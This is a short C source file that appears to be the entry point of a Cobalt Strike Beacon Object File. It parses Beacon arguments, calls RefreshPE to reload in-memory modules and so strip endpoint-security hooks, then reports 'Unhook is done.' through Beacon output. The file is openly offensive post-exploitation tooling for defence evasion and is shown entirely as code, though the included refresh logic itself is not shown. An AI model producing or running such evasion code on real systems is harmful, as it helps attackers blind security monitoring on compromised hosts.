#include "apisetmap.c"
#include "refresh.c"
#include "unhook.h"

void go(char* args, int length) {
	datap parser;
	formatp  buffer;
	char    *out;
	int      size;
	char* stomp;

	BeaconDataParse(&parser, args, length);
	stomp = BeaconDataExtract(&parser, NULL);

	BeaconFormatAlloc(&buffer, 64 * 1024);

	RefreshPE(&buffer, stomp);

	/* we're done... I guess */
	BeaconFormatPrintf(&buffer, "Unhook is done.\n");

	/* post our output */
	out = BeaconFormatToString(&buffer, &size);
	BeaconOutput(CALLBACK_OUTPUT, out, size);

	/* clean up */
	BeaconFormatFree(&buffer);
}
